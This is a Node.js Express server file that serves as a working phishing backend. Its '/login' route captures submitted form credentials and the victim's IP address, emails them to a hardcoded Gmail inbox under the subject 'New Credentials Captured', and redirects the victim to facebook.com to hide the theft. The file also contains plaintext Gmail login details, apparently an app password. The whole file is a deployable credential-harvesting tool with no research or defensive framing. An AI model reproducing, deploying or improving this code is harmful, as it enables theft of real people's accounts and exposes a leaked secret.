const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();

// Trust proxy so Render/Fly.io correctly forwards the client's real IP address
app.set('trust proxy', true);

// Middleware to parse form data and JSON
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Configure Nodemailer transporter for Gmail
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'emmanuelkefas0101@gmail.com',
        pass: 'Ewcm qhom pddx ryni'
    }
});

// Handle incoming POST requests from the form
app.post('/login', (req, res) => {
    // Extract form credentials
    const formData = req.body;
    
    // Capture client IP address (handles proxies on Render/Fly.io)
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Log locally with IP as backup
    console.log(`New submission from IP: ${clientIp}`, formData);

    // Format the email content including the IP address and form fields
    const mailOptions = {
        from: 'emmanuelkefas0101@gmail.com',
        to: 'emmanuelkefas0101@gmail.com',
        subject: 'New Credentials Captured',
        text: `New submission details:\n\nClient IP: ${clientIp}\n\nData:\n${JSON.stringify(formData, null, 2)}`
    };

    // Send the email to your inbox
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
        } else {
            console.log('Email sent successfully:', info.response);
        }
    });

    // Redirect user to Facebook
    res.redirect('https://www.facebook.com');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

